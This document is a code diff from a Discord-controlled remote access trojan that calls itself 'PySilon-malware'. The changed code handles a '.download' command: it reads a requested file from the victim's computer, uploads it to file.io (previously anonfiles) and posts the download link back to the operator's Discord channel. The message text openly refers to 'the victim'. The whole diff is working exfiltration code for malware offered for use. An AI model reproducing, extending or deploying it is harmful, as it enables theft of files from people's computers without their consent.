@@ -34,20 +34,20 @@ elif message.content[:9] == '.download':
                                 message.channel.send(e)
                                 #.log Sent message with information about this error. Aborting operation 
                                 pass
-                embed = discord.Embed(title="🟢 Success",description=f'```Uploading to anonfiles.. this can take a while depending on the file size, amount and the victim\'s internet speed..```', colour=discord.Colour.green())
+                embed = discord.Embed(title="🟢 Success",description=f'```Uploading to file.io... This can take a while depending on the file size, amount and the victim\'s internet speed..```', colour=discord.Colour.green())
                 embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
                 await message.channel.send(embed=embed)
-                #.log Sent message about Anonfiles upload 
-                files = {
-                    'file': (f'{message.content[10:]}.zip', open(f'{target_file}', 'rb')),
+                #.log Sent message about File.io upload 
+                data = {
+                    'file': open(target_file, 'rb')
                 }
-                url = 'https://api.anonfiles.com/upload'
-                #.log Set up required things for Anonfiles upload 
-                response = requests.post(url, files=files)
-                #.log Uploaded the file onto Anonfiles 
+                url = 'https://file.io/'
+                #.log Set up required things for File.io upload 
+                response = requests.post(url, files=data)
+                #.log Uploaded the file onto File.io
                 data = response.json()
-                #.log Received response from Anonfiles 
-                await message.channel.send(f"```{message.content[10:]}.zip:``` {data['data']['file']['url']['short']}")
+                #.log Received response from File.io 
+                await message.channel.send(f"```{message.content[10:]}.zip:``` {data['link']}")
                 #.log Sent Anonfiles link to uploaded file 
             else:
                 #.log File requested by Author does not exist on this PC 
